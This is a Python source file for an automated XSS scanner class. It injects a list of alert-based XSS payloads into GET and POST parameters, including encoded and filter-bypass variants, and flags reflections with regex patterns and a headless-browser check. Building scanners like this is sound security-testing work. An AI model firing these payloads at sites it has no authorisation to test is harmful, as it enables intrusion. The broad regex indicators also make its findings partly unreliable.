import asyncio
import re
import html
from typing import Dict, List, Optional, Any, Set
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass

from .base_scanner import BaseScanner, ScanContext, Finding, Severity, Confidence

import logging

logger = logging.getLogger(__name__)


@dataclass
class XSSPayload:
    name: str
    payload: str
    category: str
    context: str
    encoding: str
    description: str = ""


class XSSScanner(BaseScanner):
    """
    فاحص ثغرات XSS
    
    الميزات:
    - اكتشاف XSS المنعكس (Reflected)
    - اكتشاف XSS المخزن (Stored)
    - اكتشاف XSS في DOM
    - سياقات متعددة (HTML، Attribute، JavaScript، CSS)
    - تقنيات تجاوز متنوعة (WAF bypass)
    - التحقق من التنفيذ الفعلي
    """
    
    BASE_PAYLOADS = [
        # HTML Context
        XSSPayload("Basic HTML", "<script>alert('XSS')</script>", "reflected", "html", "none"),
        XSSPayload("HTML Event", '<img src=x onerror=alert("XSS")>', "reflected", "html", "none"),
        XSSPayload("HTML Iframe", '<iframe src="javascript:alert(\'XSS\')">', "reflected", "html", "none"),
        XSSPayload("HTML SVG", '<svg onload=alert("XSS")>', "reflected", "html", "none"),
        XSSPayload("HTML Body", '<body onload=alert("XSS")>', "reflected", "html", "none"),
        
        # Attribute Context
        XSSPayload("Attribute Break", '"><script>alert("XSS")</script>', "reflected", "attribute", "none"),
        XSSPayload("Attribute Event", '" onmouseover=alert("XSS") "', "reflected", "attribute", "none"),
        XSSPayload("Attribute JS", '" autofocus onfocus=alert("XSS") "', "reflected", "attribute", "none"),
        
        # JavaScript Context
        XSSPayload("JS String Break", '";alert("XSS");//', "reflected", "javascript", "none"),
        XSSPayload("JS Template", '${alert("XSS")}', "reflected", "javascript", "none"),
        
        # Encoded Payloads
        XSSPayload("URL Encoded", "%3Cscript%3Ealert('XSS')%3C/script%3E", "reflected", "html", "url"),
        XSSPayload("Double URL Encoded", "%253Cscript%253Ealert('XSS')%253C/script%253E", "reflected", "html", "url"),
        
        # Advanced Bypass
        XSSPayload("Case Insensitive", "<ScRiPt>alert('XSS')</sCrIpT>", "reflected", "html", "none"),
        XSSPayload("No Script Tags", "<img/src=x onerror=alert('XSS')>", "reflected", "html", "none"),
        XSSPayload("JavaScript Protocol", "javascript:alert('XSS')", "reflected", "attribute", "none"),
        XSSPayload("Data Protocol", "data:text/html,<script>alert('XSS')</script>", "reflected", "attribute", "none"),
    ]
    
    SUCCESS_INDICATORS = [
        r'<script>.*?alert.*?</script>',
        r'on\w+\s*=',
        r'javascript:',
        r'<img.*?onerror=',
        r'<svg.*?onload=',
        r'<body.*?onload=',
        r'<iframe.*?src=',
    ]
    
    def __init__(
        self,
        rate_limit: float = 2.0,
        timeout: int = 30,
        max_retries: int = 2,
        verify_execution: bool = True,
        custom_payloads: List[XSSPayload] = None
    ):
        super().__init__(
            name="XSSScanner",
            rate_limit=rate_limit,
            timeout=timeout,
            max_retries=max_retries
        )
        self._verify_execution = verify_execution
        self._custom_payloads = custom_payloads or []
        self._tested_params: Set[str] = set()
    
    async def can_scan(self, context: ScanContext) -> bool:
        url = context.target.url
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        post_params = context.target.data or {}
        
        return len(params) > 0 or len(post_params) > 0
    
    async def scan(self, context: ScanContext) -> List[Finding]:
        findings = []
        url = context.target.url
        params = context.target.params.copy()
        data = context.target.data.copy() if context.target.data else {}
        
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        all_params = {}
        for key, values in query_params.items():
            all_params[key] = values[0] if values else ""
        all_params.update(params)
        
        all_post_params = data.copy()
        
        for param_name, param_value in all_params.items():
            if param_name in self._tested_params:
                continue
            self._tested_params.add(param_name)
            
            for payload in self.BASE_PAYLOADS + self._custom_payloads:
                encoded_payload = self._apply_encoding(payload.payload, payload.encoding)
                
                modified_params = all_params.copy()
                modified_params[param_name] = encoded_payload
                
                test_url = self._build_url(url, modified_params)
                
                finding = await self._test_payload(
                    context=context,
                    url=test_url,
                    param_name=param_name,
                    payload=payload,
                    method="GET"
                )
                
                if finding:
                    findings.append(finding)
                    break
        
        for param_name, param_value in all_post_params.items():
            if f"POST:{param_name}" in self._tested_params:
                continue
            self._tested_params.add(f"POST:{param_name}")
            
            for payload in self.BASE_PAYLOADS + self._custom_payloads:
                encoded_payload = self._apply_encoding(payload.payload, payload.encoding)
                
                modified_data = all_post_params.copy()
                modified_data[param_name] = encoded_payload
                
                finding = await self._test_payload_post(
                    context=context,
                    url=url,
                    param_name=param_name,
                    payload=payload,
                    data=modified_data
                )
                
                if finding:
                    findings.append(finding)
                    break
        
        return findings
    
    async def _test_payload(
        self,
        context: ScanContext,
        url: str,
        param_name: str,
        payload: XSSPayload,
        method: str = "GET"
    ) -> Optional[Finding]:
        try:
            body = await self.send_request(url, method=method, headers=context.target.headers)
            
            if body and self._detect_xss_in_response(body, payload.payload):
                executed = False
                if self._verify_execution:
                    executed = await self._verify_execution_in_browser(url, payload.payload)
                
                confidence = Confidence.HIGH if executed else Confidence.MEDIUM
                
                finding = self.add_finding(
                    vulnerability_type="Cross-Site Scripting (XSS)",
                    severity=Severity.HIGH,
                    confidence=confidence,
                    url=url,
                    parameter=param_name,
                    payload=payload.payload,
                    evidence=f"Payload reflected: {payload.payload[:100]}",
                    description=f"{payload.category} XSS discovered using {payload.name} payload in {payload.context} context",
                    remediation="Use proper output encoding (HTML entity encode, JavaScript escape). Implement Content Security Policy (CSP).",
                    cvss_score=6.1
                )
                return finding
                
        except Exception as e:
            logger.debug(f"Error testing payload: {e}")
        
        return None
    
    async def _test_payload_post(
        self,
        context: ScanContext,
        url: str,
        param_name: str,
        payload: XSSPayload,
        data: Dict[str, str]
    ) -> Optional[Finding]:
        try:
            body = await self.send_request(url, method="POST", data=data, headers=context.target.headers)
            
            if body and self._detect_xss_in_response(body, payload.payload):
                finding = self.add_finding(
                    vulnerability_type="Cross-Site Scripting (XSS)",
                    severity=Severity.HIGH,
                    confidence=Confidence.MEDIUM,
                    url=url,
                    parameter=param_name,
                    payload=payload.payload,
                    evidence=f"Payload reflected in POST response",
                    description=f"Stored/Reflected XSS discovered in POST parameter",
                    remediation="Use proper output encoding. Implement Content Security Policy.",
                    cvss_score=6.1
                )
                return finding
                
        except Exception as e:
            logger.debug(f"Error testing POST payload: {e}")
        
        return None
    
    def _detect_xss_in_response(self, response_body: str, payload: str) -> bool:
        if payload in response_body:
            return True
        
        for pattern in self.SUCCESS_INDICATORS:
            if re.search(pattern, response_body, re.IGNORECASE):
                return True
        
        return False
    
    async def _verify_execution_in_browser(self, url: str, payload: str) -> bool:
        try:
            from playwright.async_api import async_playwright
            
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                
                alert_triggered = False
                
                async def handle_dialog(dialog):
                    nonlocal alert_triggered
                    alert_triggered = True
                    await dialog.dismiss()
                
                page.on("dialog", handle_dialog)
                
                await page.goto(url, wait_until="networkidle")
                
                executed = alert_triggered
                
                await browser.close()
                return executed
                
        except ImportError:
            logger.warning("Playwright not available, skipping execution verification")
            return False
    
    def _apply_encoding(self, payload: str, encoding: str) -> str:
        from urllib.parse import quote, quote_plus
        
        if encoding == "url":
            return quote(payload)
        elif encoding == "url_plus":
            return quote_plus(payload)
        elif encoding == "html":
            return html.escape(payload)
        elif encoding == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        else:
            return payload
    
    def _build_url(self, base_url: str, params: Dict[str, str]) -> str:
        parsed = list(urlparse(base_url))
        current_params = parse_qs(parsed[4])
        
        for key, value in params.items():
            current_params[key] = [value]
        
        parsed[4] = urlencode(current_params, doseq=True)
        return urlunparse(parsed)
    
    def add_custom_payload(self, payload: XSSPayload):
        self._custom_payloads.append(payload)
        logger.info(f"Added custom XSS payload: {payload.name}")
